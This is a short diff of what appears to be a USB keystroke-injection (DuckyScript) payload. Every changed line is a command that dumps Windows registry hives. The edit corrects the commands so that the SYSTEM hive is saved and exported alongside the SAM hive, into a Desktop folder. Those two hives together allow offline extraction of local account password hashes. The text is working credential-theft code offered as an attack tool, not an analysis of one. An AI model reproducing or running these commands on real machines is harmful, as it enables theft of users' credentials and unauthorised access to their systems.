@@ -171,10 +171,10 @@ DELAY 500
 STRING reg export HKLM\SAM %USERPROFILE%\Desktop\info\registry\SAM.reg /y
 ENTER
 DELAY 500
-STRING reg save HKLM\SAM %USERPROFILE%\Desktop\info\registry\SYSTEM.save /y
+STRING reg save HKLM\SYSTEM %USERPROFILE%\Desktop\info\registry\SYSTEM.save /y
 ENTER
 DELAY 500
-STRING reg export HKLM\SAM %USERPROFILE%\Desktop\info\registry\SYSTEM.reg /y
+STRING reg export HKLM\SYSTEM %USERPROFILE%\Desktop\info\registry\SYSTEM.reg /y
 ENTER
 DELAY 500
 
